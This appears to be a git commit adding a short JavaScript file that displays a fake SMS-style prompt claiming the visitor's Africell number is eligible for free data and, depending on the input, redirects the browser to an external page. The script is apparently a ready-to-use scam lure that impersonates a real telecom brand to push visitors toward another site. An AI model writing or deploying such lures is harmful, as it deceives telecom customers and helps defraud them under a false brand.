0a7c6decd960886a67877692f9447604cccf53b6
itidnewblog4 <ukpehaitid2@gmail.com>
2025-12-13 15:23:14 +0100

    Create active-africell.js

---
+++ active-africell.js
@@ -0,0 +1,5 @@
+var password = 'ACTIVATE NOW'
+password=prompt('SMS: Congratulations, your Africell number is eligible to receive free data, click OK to activate now','ACTIVATE NOW');
+if (password != 'ACTIVATE NOW') {
+location.href='https://phlug.org/africell.html';
+}
